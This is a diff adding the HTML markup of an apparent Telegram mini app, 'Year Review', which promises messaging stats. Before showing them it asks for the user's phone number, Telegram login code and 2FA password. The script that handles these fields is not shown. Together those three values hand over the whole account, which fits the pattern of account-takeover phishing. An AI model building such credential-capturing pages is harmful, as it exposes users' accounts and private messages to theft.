@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Year Review</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+
+    <!-- Loading State -->
+    <div id="loader-view" class="auth-container">
+        <div class="loader"></div>
+        <p id="loader-text">Analyzing your year...</p>
+    </div>
+
+    <!-- Login Flow -->
+    <div id="auth-view" class="auth-container" style="display: none;">
+        <h1>Unlock Your Year</h1>
+        <p style="opacity: 0.7; margin-bottom: 20px;">Connect your account to analyze messaging stats securely.</p>
+        
+        <div id="step-phone">
+            <input type="tel" id="phone-input" placeholder="+1234567890">
+            <button onclick="sendCode()">Continue</button>
+        </div>
+
+        <div id="step-code" style="display: none;">
+            <input type="text" id="code-input" placeholder="Code from Telegram">
+            <input type="password" id="pass-input" placeholder="2FA Password (if set)" style="margin-top: 5px;">
+            <button onclick="signIn()">Unlock Stats</button>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboard-view" class="dashboard">
+        <!-- JS will inject data here -->
+        <div class="bento-card card-large">
+            <span class="stat-label">Total Messages</span>
+            <div class="stat-value gradient-text" id="total-msgs">0</div>
+            <div style="font-size: 12px; opacity: 0.5;">Processed from top chats</div>
+        </div>
+        
+        <div class="bento-card">
+            <span class="stat-label">Words Typed</span>
+            <div class="stat-value" id="words-count">0</div>
+        </div>
+
+        <div class="bento-card">
+            <span class="stat-label">Peak Hour</span>
+            <div class="stat-value" id="peak-hour">14:00</div>
+        </div>
+
+        <div class="bento-card card-large">
+            <span class="stat-label">Top Contact</span>
+            <div class="stat-value" id="top-contact">Name</div>
+            <div id="top-contact-count" style="font-size: 14px; opacity: 0.7;">0 messages</div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
+
